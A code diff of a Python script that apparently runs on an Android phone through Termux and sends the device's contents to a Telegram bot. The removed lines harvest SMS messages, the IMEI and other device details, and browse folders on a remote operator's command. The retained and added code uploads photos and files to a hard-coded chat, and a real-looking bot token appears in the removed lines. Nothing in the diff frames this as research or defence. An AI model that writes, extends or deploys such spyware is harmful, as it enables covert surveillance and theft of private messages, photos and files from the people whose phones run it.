@@ -2,12 +2,11 @@ import os
 import requests
 import json
 import subprocess
-import shutil
 from threading import Thread, Event
 
 # Replace with your bot token and chat ID
-TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
-CHAT_ID = '6285177516'
+TOKEN = 'YOUR_BOT_TOKEN'
+CHAT_ID = 'YOUR_CHAT_ID'
 
 # Global variable to store current folder path and download state
 current_folder = "/storage/emulated/0/"
@@ -31,117 +30,23 @@ def send_to_telegram(message):
     except Exception as e:
         print(f"Error sending message: {str(e)}")
 
-# Function to get SMS details
-def get_sms():
-    try:
-        result = subprocess.run(['termux-sms-list'], stdout=subprocess.PIPE)
-        sms_list = json.loads(result.stdout.decode('utf-8'))
-        if sms_list:
-            messages = []
-            for sms in sms_list:
-                sender = sms.get('sender', 'Unknown')
-                message = sms.get('body', '')
-                messages.append(f"From: {sender}\nMessage: {message}\n")
-            return "\n".join(messages)
-        else:
-            return "No SMS messages found."
-    except Exception as e:
-        return f"Error retrieving SMS: {str(e)}"
-
-# Function to get device information
-def get_device_info():
-    try:
-        device_info = {}
-
-        # Get device model and name
+# Function to send a file to Telegram
+def send_file_to_telegram(file_path):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    with open(file_path, 'rb') as file:
+        files = {'document': file}
+        data = {"chat_id": CHAT_ID}
         try:
-            device_info['Model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
-            device_info['Device Name'] = subprocess.check_output(['getprop', 'ro.product.device']).decode().strip()
-        except subprocess.CalledProcessError:
-            device_info['Model'] = "Error retrieving model."
-            device_info['Device Name'] = "Error retrieving device name."
-
-        # Get Android version
-        try:
-            device_info['Android Version'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
-        except subprocess.CalledProcessError:
-            device_info['Android Version'] = "Error retrieving Android version."
-
-        # Get IMEI (requires root access)
-        try:
-            imei_result = subprocess.check_output(['termux-telephony-deviceinfo']).decode().strip()
-            device_info['IMEI'] = imei_result.split("\n")[0]  # Simplified extraction; adjust as needed
-        except subprocess.CalledProcessError:
-            device_info['IMEI'] = "IMEI access denied or requires root."
-
-        # Get battery status
-        try:
-            battery_status = subprocess.check_output(['termux-battery-status']).decode().strip()
-            device_info['Battery'] = battery_status
-        except subprocess.CalledProcessError:
-            device_info['Battery'] = "Error retrieving battery status."
-
-        # Get IP Address using alternative commands
-        try:
-            ip_result = subprocess.check_output(['ip', 'addr']).decode().strip()
-            ip_address = "Unable to retrieve IP address."
-            for line in ip_result.split('\n'):
-                if 'inet ' in line:
-                    ip_address = line.split()[1].split('/')[0]
-                    break
-            device_info['IP Address'] = ip_address
-        except (subprocess.CalledProcessError, FileNotFoundError):
-            device_info['IP Address'] = "Unable to retrieve IP address."
-
-        # Format the device info for Telegram
-        info_message = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
-        return info_message
-
-    except Exception as e:
-        return f"Error retrieving device info: {str(e)}"
-
-# Function to handle folder navigation
-def handle_folder_navigation(folder_name):
-    global current_folder
-    try:
-        # Update the current folder path
-        new_folder_path = os.path.join(current_folder, folder_name)
-        
-        if os.path.isdir(new_folder_path):
-            current_folder = new_folder_path
-            file_list = os.listdir(current_folder)
-            if file_list:
-                file_list_message = f"*Contents of `{current_folder}`:*\n"
-                file_list_message += "\n".join([f"`{file}`" for file in file_list])
-                file_list_message += "\n\nSend the file name to download it, or folder name to navigate."
-                send_to_telegram(file_list_message)
-            else:
-                send_to_telegram("No files or folders found.")
-        else:
-            send_to_telegram(f"`{folder_name}` is not a valid folder.")
-    except Exception as e:
-        send_to_telegram(f"Error navigating folder: {str(e)}")
-
-# Function to download a specific file
-def download_file(file_name):
-    try:
-        file_path = os.path.join(current_folder, file_name)
-        
-        if os.path.isfile(file_path):
-            # Send the file to Telegram
-            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-            files = {'document': open(file_path, 'rb')}
-            data = {"chat_id": CHAT_ID}
             response = requests.post(url, files=files, data=data)
-            
             if response.status_code == 200:
-                return f"File `{file_name}` sent successfully!"
+                print(f"File {file_path} sent successfully!")
+                send_to_telegram(f"File `{os.path.basename(file_path)}` sent successfully!")
             else:
-                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
-        else:
-            return f"File `{file_name}` does not exist or is not a valid file."
-    except Exception as e:
-        return f"Error downloading file: {str(e)}"
+                print(f"Failed to send file. Status code: {response.status_code}, Response: {response.text}")
+                send_to_telegram(f"Failed to send file `{os.path.basename(file_path)}`. Status code: {response.status_code}")
+        except Exception as e:
+            print(f"Error sending file {file_path}: {str(e)}")
+            send_to_telegram(f"Error sending file `{os.path.basename(file_path)}`: {str(e)}")
 
 # Function to download images from specified locations
 def download_images():
@@ -172,20 +77,7 @@ def download_images():
                         continue
                     
                     downloaded_files.add(file_path)
-                    
-                    # Send the file to Telegram
-                    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-                    files_to_send = {'document': open(file_path, 'rb')}
-                    data = {"chat_id": CHAT_ID}
-                    
-                    try:
-                        response = requests.post(url, files=files_to_send, data=data)
-                        if response.status_code == 200:
-                            send_to_telegram(f"Image `{file}` sent successfully!")
-                        else:
-                            send_to_telegram(f"Failed to send image `{file}`. Status code: {response.status_code}, Response: {response.text}")
-                    except Exception as e:
-                        send_to_telegram(f"Error sending image `{file}`: {str(e)}")
+                    send_file_to_telegram(file_path)
 
 # Function to handle Telegram commands for downloading photos and stopping downloads
 def handle_telegram_update(update):
